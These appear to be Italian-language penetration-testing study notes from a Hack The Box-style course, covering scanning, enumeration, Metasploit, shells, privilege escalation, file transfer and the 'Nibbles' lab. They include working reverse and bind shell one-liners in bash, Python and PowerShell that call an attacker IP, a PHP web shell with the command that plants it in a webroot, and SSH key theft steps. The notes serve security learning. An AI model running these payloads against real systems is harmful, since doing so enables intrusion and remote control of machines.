
- [Service scanning](#service-scanning)
  - [Nmap](#nmap)
  - [Attacking network services](#attacking-network-services)
    - [Banner grabbing](#banner-grabbing)
    - [FTP](#ftp)
    - [SMB](#smb)
    - [Shares](#shares)
- [Web Enumeration](#web-enumeration)
  - [Gobuster](#gobuster)
  - [Web enumeration tips](#web-enumeration-tips)
    - [Banner grabbing / web server headers](#banner-grabbing--web-server-headers)
    - [Whatweb](#whatweb)
    - [Certificates](#certificates)
    - [Robots.txt](#robotstxt)
    - [Source code](#source-code)
- [Public Exploits](#public-exploits)
  - [Metasploit Primer](#metasploit-primer)
- [Types of shells](#types-of-shells)
  - [Reverse shell](#reverse-shell)
  - [Bind shell](#bind-shell)
    - [Upgrading tty](#upgrading-tty)
  - [Web-shell](#web-shell)
    - [writing a web shell](#writing-a-web-shell)
    - [Uploading a Web Shell](#uploading-a-web-shell)
    - [Accessing web shell](#accessing-web-shell)
- [Transferring files](#transferring-files)
  - [Wget](#wget)
  - [Using SCP](#using-scp)
  - [Using Base64](#using-base64)
  - [Validating File Transfers](#validating-file-transfers)

# Service scanning

## Nmap

Se non specifichiamo nulla (solo nmap indirizzo) nmap scansiona le 1000 porte piu comuni di default.

- -sC: use nmap default scripts to obtain more detailed info (+ tempo), report anche server headers and page title for any web pages hosted on the webserver
- -sV: version scan of the service (+ tempo)
- -p-: scansione di tutte le 65535 porte tcp
- --script \<scriptname> -p port host: run a specific script

## Attacking network services

### Banner grabbing

fingerprint a service quickly
Si puo fare sia con nmap -sV --script=banner target che con nc -nv target port

### FTP

port 21, usato anche per segnalare directory disponibili pubbliche, ci si connette con ftp target
nmap -sC -sV -p21 target, vedo se c'è qualcosa di aperto sulla porta ftp a cui mi posso loggare

### SMB

server message block, protcollo provalentemente su windows che fornisce molti vettori d'attacco per vertical e lateral movement. Cruciale enumerare la surface attack con attenzione.

### Shares

smb permette a utenti e amministratori di condividere cartelle e renderle accessibili in remoto ad altri utenti. Si usa smbclient -N -L \\\\\target\\\folder, con -L si ottiene una lista di share disponibili sul host remoto, -N sopprime password prompr, con -U specifichiamo un utente. Quindi prima faccio nmap -sC p445 che è quella del protocollo smb, poi smbclient -L -U \\\\\target e vedo quale cartella e shared poi smbclient \\\\\target\\\shfolder e mi muovo al suo interno

# Web Enumeration

## Gobuster

scoprire hidden files or directory on the webserver non pensati per essere pubblici. Tools come ffuf o GoBuster per eseguire questo tipo di directory enumeration.
Gobuster consenti di fare dns, vhost, directory brute-forcing, anche aws s3 bucket enumeration

- gobuster dir -u <http://target/> -w wordlist.txt -> ritorna una serie di directory con lo status code

Wordpress ha gran potenziale come superficie di attacco
Utile scaricare SecLists github repo che contiene liste utili di fuzzing e exploitation, path: /usr/share/SecLists/Discovery/DNS/namelist.txt, al posto di dns posso inserire web-content o quello che si vuole analizzare.

- gobuster dns -d domainurl -w wordlist.txt -> ritorna sottodomini che da poter esaminare

## Web enumeration tips

### Banner grabbing / web server headers

possiamo usare curl per ottenere server headers info </br> curl -IL http:/domain, altro tool utile è eyewitness

### Whatweb

Estrae verions del web server, framowork supportati, ci aiuta ad annotare le tecnologie in uso e a scoprire potenziali vulnerabilità.

- whatweb ip
- whatweb --no-errors cidrip (ip/subnetmask)

### Certificates

Certificati SSL/TLS son potenziali sorgenti di vulnerabilita in https, possono rivelare email addr e company name per attacchi di phishing

### Robots.txt

Comune che i websites contengano il file robots.txt, fornisce location di file privati e admin pages

### Source code

Utile controllare il codice sorgente di ogni pagina visitata

# Public Exploits

Dopo aver identificato i servizi sulle porte aperte, bisogna cercare se queste app/servizi hanno exploit pubblici. Tool principale: **searchsploit**. Si possono anche usare online exploit db per cercare vulnerabilità (exploit db, rapid7 db,etc.).

## Metasploit Primer

Contiene exploits per diverse vulnerabilita e fornisce un modo facile per utilizzare questi expl contro target vulnerabili.

- msfcosole: apre metasploit
- search exploit explname
- use pathtoexpl
- optins (pathtoexpl): necessario configurare le varie opzioni per l'exploit
- set option required
- check: controlle se il server è vulnerabile all'attacco scelto
- run/exploit: lancia l'exploit
  
**note**: importante cercare bene il tipo di exploit, tramite anche searchsploit oltre che in internet, usando nmap per capire i servizi attivi con opzioni -sC che printa headers e altre info utili

# Types of shells

Connession a un host compromesso tramite ssh per linux o winrm per windows, un altro metodo è tramite shells, ce ne sono tre tipi:

## Reverse shell

ritorna la connessione al sistema attaccante e da il controllo della vittima tramite connessione inversa. Di solito si attiva un listener *nc -lvnp portn* con cui possiamo eseguire una reverse shell che connette la shell remota del target al listener nc. Quick,reliable connection verso host compromesso, ma molto fragile perche bisogna ripetere exploit da zero per riavere la connessione. Reverse shell commands:

- bash -c 'bash -i >& /dev/tcp/attackerip/listenerport 0>&1'
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

## Bind shell

Bisogna connettersi alla shell sulla porta in ascolto sul target. Bind shell commands:
  
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
- python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
- powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();  </br>
Dopo avere eseguito il comando di bind shell, ci connettiamo al target su quella porta con *nc targetip port*. A differenza della reverse ci possiamo riconnettere alla shell del target facilmente perche la porta rimane aperta. Tuttavia se l host remote viene resettato o il comando di bind shell viene stoppato, perderemo l'accesso a host remoto

### Upgrading tty

Con nc non possiamo muoverci avanti o indietro col cursore di testo e non si accedere alla command history cin le frecce su e giu, per risolvere questo problema aggiorniamo  **TTY**, mapping terminal tty con il tty del terminale remoto. Nella nostra shell con nc, si usa il seguente comando per usare python per aggiornare il tipo della nostra shell to a full tty:

- python3 -c 'import pty; pty.spawn("/bin/bash")'

Dopo questo comando, ctrl+z per mandare in background la shell, e tornare alla nostra shell locale, poi *stty raw -echo* cioè modifico tty con stty e rimuovo echo. Noteremo che la shell remote ha dimensioni sballate, quindi bisogna sistemare alcuna variabili, guardiamo le dimensioni del terminale dal nosto  locale con echo $term e con stty size. Fatto cio avremo una nc shell con tutte le caratteristiche di un terminale normale.

## Web-shell

web script tipo php o aspx, che accetta i nostri comandi tramite http request parameters di get o post request ed esgue i comandi

### writing a web shell

Scrivere la web shell che prende il comando tramite una get request, lo esegue e printa l'output. Tipica web shell php:

- \<?php  system($_REQUEST["cmd"]); ?>

### Uploading a Web Shell

Ora bisogna mettere lo script nella directory web dell'host remoto per eseguire lo script tramite web browser. Questo puo essere fatto tramire una vulnerabilita di tipo upload, che permette di scrivere lo script su in file e uploadarlo, infine accedere al file ed eseguirlo. Oppure senza accesso remoto per l'esecuzione di comandi, si puo scrivere lo script direttamente nella webroot per accedervi sul web. Webroot comuni per alcuni web servers:

- Apache /var/www/html/
- Nginx /usr/local/nginx/html/
- IIS c:\inetpub\wwwroot\
- XAMPP C:\xampp\htdocs\
  
Per es, host con linux e apache running, scriviamo una shell php col seguente comando:

- echo '\<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

### Accessing web shell

Scritta la web shell, usiamo *curl* per visitare shell.php, con parametro get: .../shell.php?cmd=id o qualsiasi altro comando.</br>
Web-shell in grado di bypassare ogni restrizione del firewall, in quanto non apre nessuna nuova connessione ma usa 80 o 443, inoltre non serve rilanciale l'exploit in caso di host rebooting, web shell è in place! Al contrario delle altre due invece, non è cosi interattiva in quanto dobbiamo ogni volta lanciare richieste get con nuovi parametri, con python script si puo rendere semi-interattivo.

# Privilege escalation


per ottenere accesso completo bisogna trovare una vulnerabilita che che scala i privilegi a utente root o administrator/SYSTEM su windows.

## PrivEsc Checklists

Ottenuto accesso al target, ci muoviamo all'interno per trovare vulnerabilità per fare exploit e raggiungere privilegi piu alti, alcuni siti di checklists di fare e comandi vari sono: [HackTricks](https://hacktricks.wiki/en/index.html), [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

## Enumeration scripts
Run many scripts per far enumerare automaticamente al server vulnerabilità possibili, come [LinEnum](https://github.com/rebootuser/LinEnum),[linuxprivchecker](https://github.com/sleventyeleven/,linuxprivchecker), per windows ci sono seatbelt e JAWS. Un altro tool per server enumeration è [PEASS](https://github.com/peass-ng/PEASS-ng).

## Kernel exploits
Quando un kernel esegue un vecchio so, cerchiamo potenziali vulnerabilita, e cercare in internet se esistono exploit per quella versione vecchia.

## Vulnerable software
dpkg -l: che software sono installati nel sistema, e cercare public exploits, specialmente per vecchie versioni

## User privileges
- sudo -l: check what sudo priv we have
- sudo su - : switch to root user
- sudo -u user /bin/command: if we can run command as user not as root

Trovare un appl che possiamo lanciare con sudo, possiamo cercare exploit per avere la shell con root. [GTFOBins](https://github.com/peass-ng/PEASS-ng) contiene una lista di comandi e come possono essere exploitati con sudo. Si cerca per quale comando abbiamo sudo privilege e se esiste si trova il comando da eseguire per ottenere accesso root. LOLBAS per windows

## Scheduled tasks
Due modi per trarre vantaggi dai scheduled tasks(windows) o cron jobs(linux) per scalare i privilegi:
1. Aggiungere nuovi scheduled tasks
2. Ingannarli per eseguire codice malevolo
Check se possiamo aggiungere nuovi tasks, serve write permission su /etc/crontab /etc/cron.d /var/spool/cron/crontabs/root

## Exposed credentials
In configuration files, log files, and user history (bash history). Enumeration scripts cercano potenziali password nei files

## SSH keys
Se read access nella cartella .ssh per un utente specifico, possiamo leggere la chiave ssh privata del target *ssh root@10.10.10.10 -i id_rsa*. Se abbiamo write access possiamo inserire la nostra chiave pubblica nel target, in modo da poter connetterci dal nostro terminale con la chiave privata al terminale del target che ha la nostra chiave pubblica salvata. Si creano le chiavi con *ssh-keygen -f outfile*


# Transferring files

Utile per trasferire files con una standard reverse shell.

## Wget

Set up a listener server on our machine, from the remote host fare wget http:/ip:port/file per scaricare il file nella macchina locale. Se host remoto non ha wget si usa curl http..../../ -o filen

## Using SCP

Con credenziali ssh del host remoto:

- scp linenum.sh user@remotehost:/tmp/linenum.sh

## Using Base64

In caso di firewall protection che previene il download,to encode the file into base64 format, and then paste the string on the remote server and decode it:

- crirom00@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... \<SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU

- user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... \<SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

## Validating File Transfers

Per validare il formato di un file di usa il comando *file*, in questo caso per il trasferminento tramite base64, si puo anche fare il check con l algoritmo hash md5, se corriponde sia in locale sia su host remoto allora file trasferito correttamente.

# Nibbles - enumeration 
Primo passo: eseguire basic enumeration
- nmap -sV --open -oA nibbles_initial_scan ip: service enum su top 1000 porte di default e ritorna solo le porte aperte, e crea tre file salvando la scansione nei tre formati principali supportati dai tool 
- nmap -v oG -: check quali porta nmap scansiona, senza specificare un target, -v verbose, -oG - greppable format, this scan will fail but will show the ports scanned.
- nmap -sV --script=... -oA nibbles_script_scan ip

# Nibbles - web footprinting
whatweb ip -> identificare l'applicazione web in uso.
whatweb ip/directory.</br> 
- gobuster dir -u http:/ip/directory --wordlist wlist.txt
- con curl analizzo tramite le rispose il contenuto delle directory del target

# Nibbles - initial foothold
- iniettare codice php, js,etc in determinati file tipo upload per vedere se il target risponde, in tal caso attivare reverse shell con la serie di comandi gia visti in precedenza
- python3 -c 'import pty; pty.spawn("/bin/bash")': serve a rendere il terminale full interactive